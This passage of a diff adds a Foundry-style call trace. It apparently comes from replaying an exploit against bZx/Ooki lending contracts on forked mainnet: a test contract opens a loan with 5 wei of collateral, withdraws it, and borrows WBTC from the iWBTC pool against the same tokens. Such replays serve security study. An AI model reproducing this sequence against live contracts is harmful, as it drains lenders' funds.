+    │   │   │   │   │   │   │   │   └─ ← [Return] YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e]
+    │   │   │   │   │   │   │   ├─ [14650] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [7096] AccessControlledOffchainAggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   │   │   ├─ [22112] iYFI::fallback() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [21396] LoanTokenLogicStandard::tokenPrice() [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [17546] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [14697] LoanSettings::getTotalPrincipal(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1082] TickMathV1::getSqrtRatioAtTick(-812034 [-8.12e5]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 184785084890 [1.847e11]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 19363816309062560436 [1.936e19]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   │   │   ├─ [425] iYFI::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000bc8924ddc3bd14876036982cf55c9200000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   │   │   ├─ [28903] 0x09Ef93750C5F33ab469851F022C1C42056a8BAda::getCurrentMargin(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 38089742649328258427 [3.808e19], 5) [staticcall]
+    │   │   │   │   │   │   │   ├─ [377] iYFI::loanTokenAddress() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e]
+    │   │   │   │   │   │   │   ├─ [2150] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1096] AccessControlledOffchainAggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   │   │   ├─ [17612] iYFI::fallback() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [16896] LoanTokenLogicStandard::tokenPrice() [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [13046] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [12197] LoanSettings::getTotalPrincipal(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [1082] TickMathV1::getSqrtRatioAtTick(-812034 [-8.12e5]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 184785084890 [1.847e11]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 19363816309062560436 [1.936e19]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   │   │   ├─ [425] iYFI::decimals() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000005b992bca25e16093a000000000000000000000000000000000bc8924ddc3bd14876036982cf55c920
+    │   │   │   │   │   │   ├─  emit topic 0: 0x7bd8cbb7ba34b33004f3deda0fd36c92fc0360acbd97843360037b467a538f90
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000b983e01458529665007ff7e0cddecdb74b967eb6
+    │   │   │   │   │   │   │        topic 3: 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8
+    │   │   │   │   │   │   │           data: 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000007f3fe9d492a9a60aebb06d82cba23c6f32cad10b0000000000000000000000000000000000000000000000021099f321a741cd7b000000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bc8924ddc3bd14876036982cf55c920000000000000000000000000000000000000000000000005b992bca25e16093a
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xbecbc7262fb7897a0e3583788d7888564d36c193f476bf6edd2648962b47edcc: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │   │   │   @ 0xb511ab5d0fcad69184007a6655728eec880780823cfede54fa87c98dceb540f0: 8 → 9
+    │   │   │   │   │   │   │   @ 0x6fe8375b07df47b08ddfe577f08e57257e034fd16f51476b463ec51413864d94: 0 → 0x0000000000000000000000007f3fe9d492a9a60aebb06d82cba23c6f32cad10b
+    │   │   │   │   │   │   │   @ 0x6fe8375b07df47b08ddfe577f08e57257e034fd16f51476b463ec51413864d93: 0 → 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2
+    │   │   │   │   │   │   │   @ 0x72f295b35bf39007268ee514b37d2b496b25c71abf8940d223be0f1669fc10e8: 0 → 107
+    │   │   │   │   │   │   │   @ 0x16102f891729262ce67210a124a159646f7714794acb4ed5a594ecb524124441: 0 → 1
+    │   │   │   │   │   │   │   @ 0x0b18dd68c457cb9e8d202293ec27db87325710d161a5350bca65d413f44573eb: 0x000000000000000000000000000000000000000000000005000b58133aac270b → 0x00000000000000000000000000000000000000000000000710a54b34e1edf486
+    │   │   │   │   │   │   │   @ 0xbecbc7262fb7897a0e3583788d7888564d36c193f476bf6edd2648962b47edc3: 0 → 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8
+    │   │   │   │   │   │   │   @ 0xbecbc7262fb7897a0e3583788d7888564d36c193f476bf6edd2648962b47edca: 0 → 0x000000000000000000000000000000000000000000000001158e460913d00000
+    │   │   │   │   │   │   │   @ 15: 106 → 107
+    │   │   │   │   │   │   │   @ 0x6fe8375b07df47b08ddfe577f08e57257e034fd16f51476b463ec51413864d96: 0 → 0x000000000000000000000000000000000000000000000000d02ab486cedc0000
+    │   │   │   │   │   │   │   @ 0xbecbc7262fb7897a0e3583788d7888564d36c193f476bf6edd2648962b47edcb: 0 → 0x000000000000000000000000000000000bc8924ddc3bd14876036982cf55c920
+    │   │   │   │   │   │   │   @ 0x6fe8375b07df47b08ddfe577f08e57257e034fd16f51476b463ec51413864d92: 0 → 1
+    │   │   │   │   │   │   │   @ 0xbecbc7262fb7897a0e3583788d7888564d36c193f476bf6edd2648962b47edc4: 0 → 0xfeca18ef871166833ec4813c50e15e8900475241857c6d931b29175902533d0a
+    │   │   │   │   │   │   │   @ 0x6fe8375b07df47b08ddfe577f08e57257e034fd16f51476b463ec51413864d91: 0 → 0xfeca18ef871166833ec4813c50e15e8900475241857c6d931b29175902533d0a
+    │   │   │   │   │   │   │   @ 0xbecbc7262fb7897a0e3583788d7888564d36c193f476bf6edd2648962b47edc8: 0 → 0x00000000000000000000000000000000000000000000000000000000656a95e7
+    │   │   │   │   │   │   │   @ 0xb286b9630b37ad67653b38d6de6b597e6a87cd50cab6e392cf29947ac1355397: 0 → 1
+    │   │   │   │   │   │   │   @ 0x6fe8375b07df47b08ddfe577f08e57257e034fd16f51476b463ec51413864d95: 0 → 0x000000000000000000000000000000000000000000000001158e460913d00000
+    │   │   │   │   │   │   │   @ 0x8d1108e10bcb7c27dddfc02ed9d693a074039d026cf4ea4240b40f7d581ac86c: 0 → 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8
+    │   │   │   │   │   │   │   @ 0x1dacdb9f3991cf4e98101c2c0272973a2f81acc26bd40cf93d975cd7346871d0: 0 → 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8
+    │   │   │   │   │   │   │   @ 0xe271290e3f1e4c474ea08e874d09b4a29381ffd8e17b561e1727f3501c16c322: 0 → 0x000000000000000000000000000000003d33c5ff81b90d266d895ca5456d1fd3
+    │   │   │   │   │   │   │   @ 0xbecbc7262fb7897a0e3583788d7888564d36c193f476bf6edd2648962b47edc7: 0 → 5
+    │   │   │   │   │   │   │   @ 0xbecbc7262fb7897a0e3583788d7888564d36c193f476bf6edd2648962b47edcd: 0 → 0x000000000000000000000001b983e01458529665007ff7e0cddecdb74b967eb6
+    │   │   │   │   │   │   │   @ 0xbecbc7262fb7897a0e3583788d7888564d36c193f476bf6edd2648962b47edc6: 0 → 0x0000000000000000000000000000000000000000000000021099f321a741cd7b
+    │   │   │   │   │   │   │   @ 0xf3ebe3e084627c197a8adcabe98790dfac10cd5a66bb42bbb2f93eb83f3c53e1: 0 → 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8
+    │   │   │   │   │   │   │   @ 0xd1b1491cea2e483741ea5887871f9db447520f3517ce94fc6f53230bb4701c35: 0 → 9
+    │   │   │   │   │   │   └─ ← [Return] 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c80000000000000000000000000000000000000000000000021099f321a741cd7b0000000000000000000000000000000000000000000000000000000000000005
+    │   │   │   │   │   └─ ← [Return] 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c80000000000000000000000000000000000000000000000021099f321a741cd7b0000000000000000000000000000000000000000000000000000000000000005
+    │   │   │   │   └─ ← [Return] LoanOpenData({ loanId: 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8, principal: 38089742649328258427 [3.808e19], collateral: 5 })
+    │   │   │   └─ ← [Return] LoanOpenData({ loanId: 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8, principal: 38089742649328258427 [3.808e19], collateral: 5 })
+    │   │   ├─ [21974] WETH::deposit{value: 38089742649328258427}()
+    │   │   │   ├─ emit Deposit(dst: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 38089742649328258427 [3.808e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000021099f321a741cd7b
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [108366] bzX::fallback(0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5)
+    │   │   │   ├─ [103013] 0x91fcdb277e84642Ef29db708Ff35aA48bA20F04d::withdrawCollateral(0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5) [delegatecall]
+    │   │   │   │   ├─ [28376] 0x09Ef93750C5F33ab469851F022C1C42056a8BAda::getMaxDrawdown(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 38089742649328258427 [3.808e19], 5, 15000000000000000000 [1.5e19]) [staticcall]
+    │   │   │   │   │   ├─ [377] iYFI::loanTokenAddress() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e]
+    │   │   │   │   │   ├─ [2150] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   ├─ [1096] AccessControlledOffchainAggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   ├─ [17612] iYFI::fallback() [staticcall]
+    │   │   │   │   │   │   ├─ [16896] LoanTokenLogicStandard::tokenPrice() [delegatecall]
+    │   │   │   │   │   │   │   ├─ [13046] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [12197] LoanSettings::getTotalPrincipal(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [1082] TickMathV1::getSqrtRatioAtTick(-812034 [-8.12e5]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 184785084890 [1.847e11]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 19363816309062560436 [1.936e19]
+    │   │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   ├─ [425] iYFI::decimals() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000005
+    │   │   │   │   ├─ [24571] iYFI::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5)
+    │   │   │   │   │   ├─ [23822] LoanTokenLogicStandard::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: bzX: [0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5)
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x6d04141ac5829843ee56592e8ca7359578402175753dee6e04e521ddffbc8257: 5 → 0
+    │   │   │   │   │   │   │   @ 0x16102f891729262ce67210a124a159646f7714794acb4ed5a594ecb524124440: 0 → 5
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit VaultWithdraw(param0: iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 5)
+    │   │   │   │   ├─ [25411] 0x09Ef93750C5F33ab469851F022C1C42056a8BAda::queryRate(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
+    │   │   │   │   │   ├─ [377] iYFI::loanTokenAddress() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] YFI: [0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e]
+    │   │   │   │   │   ├─ [2150] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   ├─ [1096] AccessControlledOffchainAggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   │   └─ ← [Return] 4044382180629397000 [4.044e18]
+    │   │   │   │   │   ├─ [17612] iYFI::fallback() [staticcall]
+    │   │   │   │   │   │   ├─ [16896] LoanTokenLogicStandard::tokenPrice() [delegatecall]
+    │   │   │   │   │   │   │   ├─ [13046] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [12197] LoanSettings::getTotalPrincipal(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0x0000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ [1082] TickMathV1::getSqrtRatioAtTick(-812034 [-8.12e5]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 184785084890 [1.847e11]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   ├─ [541] YFI::balanceOf(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 19363816309062560436 [1.936e19]
+    │   │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   │   └─ ← [Return] 3872763261812512087200000000000000000 [3.872e36]
+    │   │   │   │   │   ├─ [425] iYFI::decimals() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 18
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000bc8924ddc3bd14876036982cf55c9200000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   ├─  emit topic 0: 0x6fdb66f06832f41be9e4313f93e9b50685b11f2540d275342262997f35da8810
+    │   │   │   │   │        topic 1: 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8
+    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000043ed59cbcaa44aad20000000000000000000000000000000000000000000000000000000000000005
+    │   │   │   │   ├─  emit topic 0: 0x7b1bab051266a4a36232da9b4341daf225fa42f7202b0e7207b9b502644ff1bb
+    │   │   │   │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   │   │        topic 2: 0x0000000000000000000000007f3fe9d492a9a60aebb06d82cba23c6f32cad10b
+    │   │   │   │   │        topic 3: 0xcbcfeb6595b7007c09a69b0971cf031c31542fdeaa266c6af95cd8bc8ddb62c8
+    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000005
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xbecbc7262fb7897a0e3583788d7888564d36c193f476bf6edd2648962b47edc7: 5 → 0
+    │   │   │   │   └─ ← [Return] 5
+    │   │   │   └─ ← [Return] 5
+    │   │   ├─ [25897] iYFI::fallback(iWBTC: [0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ [25179] LoanTokenLogicStandard::approve(iWBTC: [0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: iWBTC: [0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xe9416dfbecbb54cae949cf0819370f2afb99ed1d9dedd67d6181a0ec9c931b40: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [26724] WBTC::approve(SushiRouter: [0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: SushiRouter: [0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xb7b2d76ffd9913762473e3aba6bedeec6042507b489f25504d98dd2700cec087: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2795] WBTC::balanceOf(iWBTC: [0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E]) [staticcall]
+    │   │   │   └─ ← [Return] 22651422 [2.265e7]
+    │   │   ├─ [862915] iWBTC::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 22651422 [2.265e7], 0, 5, iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [860143] LoanTokenLogicStandard::borrow(0x0000000000000000000000000000000000000000000000000000000000000000, 22651422 [2.265e7], 0, 5, iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x) [delegatecall]
+    │   │   │   │   ├─ [137879] bzX::fallback(0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [137041] 0xaECAD4373Dc7fD95c37cb56446B8DD9dD1394811::settleInterest(0x0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   │   ├─ [1601] 0x6Ae6CECaa083F7245abf8F96e79d338C6fB297fA::getTickAtSqrtRatio(100000000000000000 [1e17]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] -547992 [-5.479e5]
+    │   │   │   │   │   │   ├─ [1110] 0x6Ae6CECaa083F7245abf8F96e79d338C6fB297fA::getSqrtRatioAtTick(-547992 [-5.479e5]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 99995264265221703 [9.999e16]
+    │   │   │   │   │   │   ├─ [39594] iWBTC::_nextBorrowInterestRate(0, 0, 99995264265221703 [9.999e16]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [38839] LoanTokenLogicStandard::_nextBorrowInterestRate(0, 0, 99995264265221703 [9.999e16]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [795] WBTC::balanceOf(iWBTC: [0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 22651422 [2.265e7]
+    │   │   │   │   │   │   │   │   ├─ [28414] 0xFbdD8919c8B2ad0Ea06da5ca8BC4d3e29cf3D2e4::calculateIR(0, 99995264265221703 [9.999e16]) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000016345785d8a0000
+    │   │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000 [1e17]
+    │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000 [1e17]
+    │   │   │   │   │   │   ├─ emit PoolInterestRateVals(pool: iWBTC: [0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E], poolPrincipalTotal: 0, poolInterestTotal: 0, poolRatePerTokenStored: 13199184224523205042457125190258751887 [1.319e37], poolNextInterestRate: 100000000000000000 [1e17])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x4c286b4c30ef1395af4f79e83e297bbf9db10eea98eba140f726f03d5ca8c9d3: 0x0000000000000000000000000000000000000000000000000000000064883ccf → 0x00000000000000000000000000000000000000000000000000000000656a95e7
+    │   │   │   │   │   │   │   @ 0xf9cb2353ce51cdf971a93619137dc9649b17937984c9bf38b3b30f8c01f2126d: 0 → 0x000000000000000000000000000000000000f7a368ffe0db6649bf44656a95e7
+    │   │   │   │   │   │   │   @ 0xa176c7ac682358162d4b0fbf405aec92de8cc3e3eea3622bbea54cd6a3ef0f30: 0x000000000000000000000000000000000664262675693fd992f806ffe318f6a3 → 0x0000000000000000000000000000000009ee1206a6095d43e2d2e193eec9798f
+    │   │   │   │   │   │   │   @ 0x54dbe981453e83ad2d736293fb6401e437083565c1ba1a29c3356677db679bf8: 36 → 37
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ [795] WBTC::balanceOf(iWBTC: [0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 22651422 [2.265e7]
+    │   │   │   │   ├─ [28803] WBTC::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22651422 [2.265e7])
+    │   │   │   │   │   ├─ emit Transfer(from: iWBTC: [0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 22651422 [2.265e7])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x0d4c93ccac8b8254f9f05071fcea065d5beef23a774ae831f0702601b4ce1edb: 0x000000000000000000000000000000000000000000000000000000000159a21e → 0
+    │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000000000000000000000159a21e
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [27459] iYFI::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], bzX: [0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f], 5)
+    │   │   │   │   │   ├─ [26735] LoanTokenLogicStandard::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], bzX: [0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f], 5) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: bzX: [0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f], value: 5)
+    │   │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: iWBTC: [0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639930 [1.157e77])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x16102f891729262ce67210a124a159646f7714794acb4ed5a594ecb524124440: 5 → 0
+    │   │   │   │   │   │   │   @ 0x6d04141ac5829843ee56592e8ca7359578402175753dee6e04e521ddffbc8257: 0 → 5
+    │   │   │   │   │   │   │   @ 0xe9416dfbecbb54cae949cf0819370f2afb99ed1d9dedd67d6181a0ec9c931b40: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [641048] bzX::fallback(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b, true, 0, [0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [0, 22651422 [2.265e7], 0, 0, 5], 0x)
+    │   │   │   │   │   ├─ [640110] 0xF426F2609784541653Cc351485592E82e57DcB58::borrowOrTradeFromPool(iYFI: [0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b], 0xb6172b3fe11168b42f7273637b7b63b7722b1c68bf07cfeec3781fa983954f2b, true, 0, [0x2ffa85f655752fB2aCB210287c60b9ef335f5b6E, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x0000000000000000000000000000000000000000], [0, 22651422 [2.265e7], 0, 0, 5], 0x) [delegatecall]
